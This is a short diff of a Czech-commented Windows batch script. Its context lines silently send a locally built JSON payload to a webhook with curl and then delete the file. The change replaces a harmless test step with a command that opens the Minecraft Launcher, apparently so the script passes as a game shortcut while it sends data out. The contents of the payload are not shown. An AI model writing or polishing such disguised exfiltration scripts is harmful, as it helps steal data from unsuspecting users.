@@ -53,12 +53,10 @@ echo } >> "!payload!"
 curl -s -X POST %webhook% -H "Content-Type: application/json" --data "@!payload!" >nul
 del /f /q "!payload!"
 
-:: ──────────────── LOKÁLNÍ AKCE DOLE ────────────────
+:: ──────────────── SPUŠTĚNÍ MINECRAFT LAUNCHERU ────────────────
 
-:: 📝 Vytvoření souboru ahoj.bat v %TEMP% a otevření v Notepadu
-set "ahojbat=%TEMP%\ahoj.bat"
-echo echo ahoj > "!ahojbat!"
-start notepad "!ahojbat!"
+:: 🚀 Otevře Minecraft Launcher (standardní instalace)
+start "" "C:\Program Files (x86)\Minecraft Launcher\MinecraftLauncher.exe"
 
 :: ✅ Hotovo
 exit
